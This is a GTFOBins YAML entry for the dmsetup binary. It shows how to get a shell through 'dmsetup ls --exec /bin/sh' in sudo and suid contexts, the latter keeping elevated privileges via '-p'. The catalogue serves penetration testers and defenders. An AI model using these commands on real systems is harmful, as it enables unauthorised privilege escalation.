<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/dmsetup -->
---
functions:
  shell:
  - code: |-
      dmsetup create base <<EOF
      0 3534848 linear /dev/loop0 94208
      EOF
      dmsetup ls --exec '/bin/sh -s'
    contexts:
      sudo:
      suid:
        code: |-
          dmsetup create base <<EOF
          0 3534848 linear /dev/loop0 94208
          EOF
          dmsetup ls --exec '/bin/sh -p -s'
      unprivileged:
...
